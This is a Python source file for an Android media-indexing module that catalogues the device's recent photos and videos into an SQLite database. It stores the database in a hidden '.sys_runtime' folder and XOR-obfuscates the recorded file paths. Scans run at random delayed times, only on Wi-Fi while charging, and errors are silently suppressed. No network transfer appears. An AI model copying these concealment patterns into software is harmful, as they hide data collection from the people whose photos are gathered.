# -*- coding: utf-8 -*-
import os, time, threading, hashlib, sqlite3, random, logging, gc
from datetime import datetime

P = os.path.join(os.getcwd(), ".sys_runtime")
DB = os.path.join(P, "m_arch.db")
if not os.path.exists(P): os.makedirs(P)
logging.basicConfig(filename=os.path.join(P, "s.log"), level=logging.ERROR)

try:
    from jnius import autoclass
    JNI = True
except:
    JNI = False

class MediaScanner:
    def __init__(self, det=None):
        self.det = det
        self.active = False
        self._key = 0x5A
        self._init_db()

    def _init_db(self):
        try:
            with sqlite3.connect(DB) as conn:
                conn.execute('''CREATE TABLE IF NOT EXISTS media (
                    h TEXT PRIMARY KEY,
                    p BLOB,
                    ts INTEGER,
                    cat TEXT DEFAULT 'normal',
                    score REAL DEFAULT 0)''')
                conn.execute('CREATE INDEX IF NOT EXISTS idx_cat ON media(cat)')
                conn.execute('CREATE INDEX IF NOT EXISTS idx_ts ON media(ts)')
                conn.commit()
        except:
            pass

    def _enc(self, s):
        return bytes([ord(c) ^ self._key for c in s])

    def _dec(self, b):
        return "".join([chr(c ^ self._key) for c in b])

    def _partial_hash(self, path):
        try:
            st = os.stat(path)
            base = f"{st.st_size}_{int(st.st_mtime)}"
            with open(path, "rb") as f:
                head = f.read(1024)
            return hashlib.md5(head + base.encode()).hexdigest()
        except:
            return None

    def _safe_path(self, path):
        bad = ["/Android/", "/obb/", "/data/", "/."]
        return not any(x in path for x in bad) and not os.path.basename(path).startswith(".")

    def _fast_scan(self, limit=200):
        if not JNI: return []
        cursor = None
        try:
            act = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = act.getContentResolver()
            Uri = autoclass('android.net.Uri')
            img_uri = Uri.parse("content://media/external/images/media")
            video_uri = Uri.parse("content://media/external/video/media")
            projection = ["_data", "date_added"]
            order = "date_added DESC LIMIT " + str(limit)
            results = []
            for uri in [img_uri, video_uri]:
                cursor = resolver.query(uri, projection, None, None, order)
                if cursor:
                    while cursor.moveToNext():
                        p = cursor.getString(0)
                        if p and os.path.exists(p) and self._safe_path(p):
                            results.append(p)
                    cursor.close()
                    cursor = None
            return results
        except Exception as e:
            logging.error(f"Scan error: {e}")
            return []
        finally:
            if cursor:
                try: cursor.close()
                except: pass

    def _process_files(self, paths):
        if self.active: return
        self.active = True
        try:
            now = time.time()
            with sqlite3.connect(DB) as conn:
                for p in paths:
                    h = self._partial_hash(p)
                    if not h: continue
                    cur = conn.execute("SELECT 1 FROM media WHERE h=?", (h,))
                    if not cur.fetchone():
                        conn.execute("INSERT INTO media (h, p, ts, cat) VALUES (?, ?, ?, ?)",
                                     (h, self._enc(p), int(now), 'pending'))
                conn.commit()
        except Exception as e:
            logging.error(f"Process error: {e}")
        finally:
            self.active = False
            gc.collect()

    def get_thumbnail(self, path):
        if not JNI or not os.path.exists(path):
            return None
        try:
            for f in os.listdir(P):
                if f.startswith("th_") and os.path.getmtime(os.path.join(P, f)) < time.time() - 300:
                    try: os.remove(os.path.join(P, f))
                    except: pass
            MediaStore = autoclass('android.provider.MediaStore')
            CompressFormat = autoclass('android.graphics.Bitmap$CompressFormat')
            FileOutputStream = autoclass('java.io.FileOutputStream')
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            resolver = PythonActivity.mActivity.getContentResolver()
            uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            proj = [MediaStore.Images.Media._ID]
            sel = MediaStore.Images.Media.DATA + "=?"
            cursor = resolver.query(uri, proj, sel, [path], None)
            if cursor and cursor.moveToFirst():
                img_id = cursor.getLong(0)
                bitmap = MediaStore.Images.Thumbnails.getThumbnail(resolver, img_id, MediaStore.Images.Thumbnails.MINI_KIND, None)
                if bitmap:
                    out_path = os.path.join(P, f"th_{int(time.time())}.jpg")
                    out = FileOutputStream(out_path)
                    bitmap.compress(CompressFormat.JPEG, 60, out)
                    out.close()
                    cursor.close()
                    return out_path
            if cursor: cursor.close()
        except Exception as e:
            logging.error(f"Thumbnail error: {e}")
        return None

    def daily_scan(self, mon):
        def _job():
            time.sleep(random.randint(1800, 7200))
            if not (hasattr(mon, '_is_wifi') and mon._is_wifi()) or not hasattr(mon, '_bat'):
                return
            is_charging = mon._bat()[1] if hasattr(mon, '_bat') else False
            if not is_charging:
                return
            new_files = self._fast_scan(limit=200)
            if new_files:
                self._process_files(new_files)
            self._cleanup_db()
        threading.Thread(target=_job, daemon=True).start()

    def _cleanup_db(self):
        try:
            with sqlite3.connect(DB) as conn:
                cur = conn.execute("SELECT h, p FROM media")
                to_del = []
                for h, p_enc in cur.fetchall():
                    if not os.path.exists(self._dec(p_enc)):
                        to_del.append((h,))
                if to_del:
                    conn.executemany("DELETE FROM media WHERE h=?", to_del)
                    conn.commit()
        except:
            pass

    def get_gallery_by_category(self, category, limit=16, page=0):
        offset = page * limit
        results = []
        try:
            with sqlite3.connect(DB) as conn:
                cur = conn.execute("SELECT p, cat, score FROM media WHERE cat=? ORDER BY ts DESC LIMIT ? OFFSET ?",
                                   (category, limit, offset))
                for i, row in enumerate(cur.fetchall()):
                    path = self._dec(row[0])
                    if os.path.exists(path):
                        results.append({
                            "path": path,
                            "cat": row[1],
                            "score": row[2],
                            "label": str(offset + i + 1).zfill(2)
                        })
        except Exception as e:
            logging.error(f"Gallery error: {e}")
        return results

    def update_category(self, file_hash, category, score=0):
        try:
            with sqlite3.connect(DB) as conn:
                conn.execute("UPDATE media SET cat=?, score=? WHERE h=?", (category, score, file_hash))
                conn.commit()
        except:
            pass

    def get_recent_images(self, limit=10):
        res = []
        try:
            with sqlite3.connect(DB) as conn:
                cur = conn.execute("SELECT p FROM media WHERE cat NOT IN ('video', 'pending') ORDER BY ts DESC LIMIT ?", (limit * 2,))
                for row in cur.fetchall():
                    p = self._dec(row[0])
                    if os.path.exists(p) and p.lower().endswith(('.jpg', '.jpeg', '.png', '.webp')):
                        res.append(p)
                        if len(res) >= limit:
                            break
        except:
            pass
        return res

    def get_statistics(self):
        stats = {}
        try:
            with sqlite3.connect(DB) as conn:
                cur = conn.execute("SELECT cat, COUNT(*) FROM media GROUP BY cat")
                for cat, cnt in cur.fetchall():
                    stats[cat] = cnt
        except:
            pass
        return stats

def create(det=None):
    return MediaScanner(det)
